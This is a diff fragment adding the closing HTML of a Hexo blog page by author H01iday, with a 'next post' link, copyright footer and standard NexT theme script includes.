+                <a href="/2021/09/17/xss-portswigger/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">H01iday</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
